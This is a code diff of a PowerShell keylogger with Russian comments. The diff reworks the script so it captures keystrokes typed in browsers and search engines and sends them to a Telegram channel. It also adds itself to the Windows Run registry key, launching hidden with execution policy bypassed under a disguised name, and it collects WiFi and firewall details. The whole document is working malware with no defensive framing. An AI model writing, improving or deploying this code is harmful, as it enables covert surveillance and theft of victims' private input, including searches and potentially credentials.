@@ -20,7 +20,7 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ПОИСКОВЫХ ЗАПРОСОВ
+# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПОИСКА
 $keyloggerStatus = "Starting..."
 
 # Создаем улучшенный кейлоггер для поиска
@@ -29,9 +29,8 @@ Add-Type -AssemblyName System.Windows.Forms
 
 `$capturedData = @()
 `$currentWindow = ""
-`$buffer = ""
 `$searchBuffer = ""
-`$inSearch = `$false
+`$lastSearch = ""
 
 function Send-ToTelegram {
     param(`$message)
@@ -45,8 +44,9 @@ function Send-ToTelegram {
 }
 
 function Process-Search {
-    if(`$searchBuffer -ne "" -and `$searchBuffer.Length -gt 2) {
-        Send-ToTelegram "🔍 SEARCH QUERY: `$searchBuffer"
+    if(`$searchBuffer -ne "" -and `$searchBuffer -ne `$lastSearch) {
+        Send-ToTelegram "🔍 SEARCH DETECTED: `$searchBuffer"
+        `$lastSearch = `$searchBuffer
         `$capturedData += "SEARCH: `$searchBuffer"
         `$searchBuffer = ""
     }
@@ -61,232 +61,137 @@ while(`$true) {
             `$activeWindow = `$processes[0].MainWindowTitle
         }
         
-        # Определяем, находится ли пользователь в поиске
-        `$wasInSearch = `$inSearch
-        `$inSearch = (`$activeWindow -like "*поиск*" -or 
-                     `$activeWindow -like "*search*" -or 
-                     `$activeWindow -like "*google*" -or 
-                     `$activeWindow -like "*yandex*" -or 
-                     `$activeWindow -like "*bing*" -or
-                     `$activeWindow -like "*find*" -or
-                     `$activeWindow -like "*искать*")
-        
-        # Если только что вошли в поиск
-        if(`$inSearch -and !`$wasInSearch) {
-            Send-ToTelegram "🎯 USER STARTED SEARCHING: `$activeWindow"
+        # Определяем поисковые системы и поля поиска
+        `$isSearchContext = `$false
+        if(`$activeWindow -like "*google*" -or 
+           `$activeWindow -like "*yandex*" -or 
+           `$activeWindow -like "*bing*" -or 
+           `$activeWindow -like "*search*" -or
+           `$activeWindow -like "*поиск*" -or
+           `$activeWindow -match "браузер" -or
+           `$activeWindow -like "*chrome*" -or
+           `$activeWindow -like "*firefox*" -or
+           `$activeWindow -like "*edge*" -or
+           `$activeWindow -like "*opera*" -or
+           `$activeWindow -like "*safari*") {
+            `$isSearchContext = `$true
         }
         
-        # Если только что вышли из поиска
-        if(!`$inSearch -and `$wasInSearch) {
-            Process-Search
-        }
-        
-        # Перехватываем все нажатия клавиш
-        for(`$i = 8; `$i -lt 255; `$i++) {
-            `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-            if(`$keyState -eq -32767) {
-                `$key = [System.Windows.Forms.Keys]`$i
-                
-                # Обрабатываем специальные клавиши
-                switch(`$key) {
-                    "Enter" { 
-                        if(`$inSearch) {
+        # Перехватываем нажатия клавиш в поисковом контексте
+        if(`$isSearchContext) {
+            for(`$i = 8; `$i -lt 255; `$i++) {
+                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+                if(`$keyState -eq -32767) {
+                    `$key = [System.Windows.Forms.Keys]`$i
+                    
+                    # Обрабатываем специальные клавиши
+                    switch(`$key) {
+                        "Enter" { 
                             Process-Search
                         }
-                    }
-                    "Space" { 
-                        `$buffer += " "
-                        if(`$inSearch) {
-                            `$searchBuffer += " "
+                        "Space" { 
+                            `$searchBuffer += " " 
                         }
-                    }
-                    "Back" { 
-                        if(`$buffer.Length -gt 0) { 
-                            `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
+                        "Back" { 
+                            if(`$searchBuffer.Length -gt 0) { 
+                                `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
+                            }
                         }
-                        if(`$inSearch -and `$searchBuffer.Length -gt 0) { 
-                            `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
-                        }
-                    }
-                    "Tab" { 
-                        `$buffer += "[TAB]"
-                        if(`$inSearch) {
+                        "Tab" { 
                             `$searchBuffer += "[TAB]"
                         }
-                    }
-                    "LButton" { 
-                        # Клик мыши - обрабатываем поисковый буфер
-                        if(`$inSearch) {
+                        "LButton" { 
+                            # Клик мыши - обрабатываем поиск
                             Process-Search
                         }
-                    }
-                    "RButton" { 
-                        # Правый клик - обрабатываем поисковый буфер
-                        if(`$inSearch) {
+                        "RButton" { 
+                            # Правый клик - обрабатываем поиск
                             Process-Search
                         }
-                    }
-                    "Escape" {
-                        if(`$inSearch) {
-                            Process-Search
-                        }
-                    }
-                    default {
-                        # Обрабатываем обычные символы
-                        if(`$key -ge 65 -and `$key -le 90) {
-                            # Буквы A-Z
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                            `$isCaps = [System.Windows.Forms.Console]::CapsLock
-                            
-                            if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                                `$char = `$key.ToString()
-                            } else {
-                                `$char = `$key.ToString().ToLower()
-                            }
-                            
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -ge 48 -and `$key -le 57) {
-                            # Цифры 0-9
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                            `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                            if(`$isShift) {
-                                `$char = `$symbols[`$key - 48]
-                            } else {
-                                `$char = (`$key - 48).ToString()
-                            }
-                            
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 190 -or `$key -eq 110) {
-                            # Точка
-                            `$char = "."
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 189 -or `$key -eq 109) {
-                            # Минус/дефис
-                            `$char = "-"
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 187 -or `$key -eq 107) {
-                            # Плюс/равно
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                            if(`$isShift) {
-                                `$char = "+"
-                            } else {
-                                `$char = "="
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 186 -or `$key -eq 59) {
-                            # Точка с запятой/двоеточие
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = ":"
-                            } else {
-                                `$char = ";"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 188 -or `$key -eq 44) {
-                            # Запятая
-                            `$char = ","
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 191 -or `$key -eq 47) {
-                            # Слеш/вопросительный знак
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = "?"
-                            } else {
-                                `$char = "/"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 192 -or `$key -eq 96) {
-                            # Тильда/апостроф
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = "~"
-                            } else {
-                                `$char = "`"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 219 -or `$key -eq 91) {
-                            # Открывающая скобка
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = "{"
-                            } else {
-                                `$char = "["
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 221 -or `$key -eq 93) {
-                            # Закрывающая скобка
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = "}"
-                            } else {
-                                `$char = "]"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 220 -or `$key -eq 92) {
-                            # Обратный слеш/вертикальная черта
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = "|"
-                            } else {
-                                `$char = "\"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
-                            }
-                        } elseif(`$key -eq 222 -or `$key -eq 39) {
-                            # Кавычки
-                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
-                            if(`$isShift) {
-                                `$char = """
-                            } else {
-                                `$char = "'"
-                            }
-                            `$buffer += `$char
-                            if(`$inSearch) {
-                                `$searchBuffer += `$char
+                        default {
+                            # Обрабатываем обычные символы
+                            if(`$key -ge 65 -and `$key -le 90) {
+                                # Буквы A-Z
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
+                                
+                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
+                                    `$searchBuffer += `$key.ToString()
+                                } else {
+                                    `$searchBuffer += `$key.ToString().ToLower()
+                                }
+                            } elseif(`$key -ge 48 -and `$key -le 57) {
+                                # Цифры 0-9
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
+                                if(`$isShift) {
+                                    `$searchBuffer += `$symbols[`$key - 48]
+                                } else {
+                                    `$searchBuffer += (`$key - 48).ToString()
+                                }
+                            } elseif(`$key -eq 190 -or `$key -eq 110) {
+                                # Точка
+                                `$searchBuffer += "."
+                            } elseif(`$key -eq 189 -or `$key -eq 109) {
+                                # Минус/дефис
+                                `$searchBuffer += "-"
+                            } elseif(`$key -eq 187 -or `$key -eq 107) {
+                                # Плюс/равно
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "+"
+                                } else {
+                                    `$searchBuffer += "="
+                                }
+                            } elseif(`$key -eq 186 -or `$key -eq 59) {
+                                # Точка с запятой/двоеточие
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += ":"
+                                } else {
+                                    `$searchBuffer += ";"
+                                }
+                            } elseif(`$key -eq 222) {
+                                # Кавычки/апостроф
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "`""
+                                } else {
+                                    `$searchBuffer += "'"
+                                }
+                            } elseif(`$key -eq 188 -or `$key -eq 108) {
+                                # Запятая
+                                `$searchBuffer += ","
+                            } elseif(`$key -eq 191 -or `$key -eq 111) {
+                                # Слеш/вопрос
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "?"
+                                } else {
+                                    `$searchBuffer += "/"
+                                }
+                            } elseif(`$key -eq 220) {
+                                # Обратный слеш/вертикальная черта
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$searchBuffer += "|"
+                                } else {
+                                    `$searchBuffer += "\"
+                                }
                             }
                         }
+                    }
+                    
+                    # Автоматически отправляем длинные поисковые запросы
+                    if(`$searchBuffer.Length -gt 30) {
+                        Process-Search
                     }
                 }
-                
-                # Автоматически отправляем длинные поисковые запросы
-                if(`$inSearch -and `$searchBuffer.Length -gt 30) {
-                    Process-Search
-                }
+            }
+        } else {
+            # Если вышли из поискового контекста - обрабатываем оставшийся буфер
+            if(`$searchBuffer -ne "" -and `$searchBuffer -ne `$lastSearch) {
+                Process-Search
             }
         }
     } catch { }
@@ -302,7 +207,7 @@ try {
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`""
-    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $startupPath -Name "SearchMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
     $keyloggerStatus = "✅ Advanced search logger active - monitoring all search queries"
 } catch {
@@ -354,11 +259,6 @@ $wifi
 
 === SEARCH LOGGER STATUS ===
 $keyloggerStatus
-
-=== MONITORING ===
-• Все поисковые запросы в Google, Yandex, Bing
-• Поиск в браузерах и приложениях
-• Поисковые формы на сайтах
 
 === SECURITY STATUS ===
 Firewall: 
